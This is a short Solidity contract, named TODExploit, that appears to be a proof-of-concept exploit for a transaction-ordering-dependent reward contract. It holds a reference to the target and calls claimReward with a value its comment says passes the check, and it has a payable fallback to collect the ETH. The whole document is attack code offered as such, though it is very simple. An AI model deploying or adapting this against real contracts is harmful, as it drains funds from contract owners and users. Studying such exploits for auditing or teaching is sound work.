pragma solidity ^0.4.16;

interface IVulnerable {
    function claimReward(uint256 submission) external;
}

contract TODExploit {
    IVulnerable public target;

    function TODExploit(address _target) public {
        target = IVulnerable(_target);
    }

    function exploit() public {
        // Choose submission < 10 to pass check
        target.claimReward(1);
    }

    // Optional: receive fallback to accept ETH
    function () public payable {}
}

